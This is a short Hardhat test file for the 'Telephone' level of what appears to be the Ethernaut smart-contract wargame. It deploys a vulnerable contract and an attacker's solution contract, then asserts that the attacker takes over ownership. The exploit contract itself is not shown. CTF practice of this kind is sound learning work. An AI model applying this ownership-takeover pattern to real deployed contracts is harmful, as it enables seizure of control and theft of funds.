const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Telephone', function () {
  let deployer, attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();
    const Telephone = await ethers.getContractFactory('Telephone', deployer);
    const TelephoneSolution = await ethers.getContractFactory('TelephoneSolution', attacker);

    this.telephone = await Telephone.deploy();
    this.telephoneSolution = await TelephoneSolution.deploy(this.telephone.address);
  });

  it('Takes over the contract', async function () {
    expect(await this.telephone.owner()).to.be.eq(deployer.address);

    await this.telephoneSolution.changeOwner(attacker.address);

    expect(await this.telephone.owner()).to.be.eq(attacker.address);
  });
});
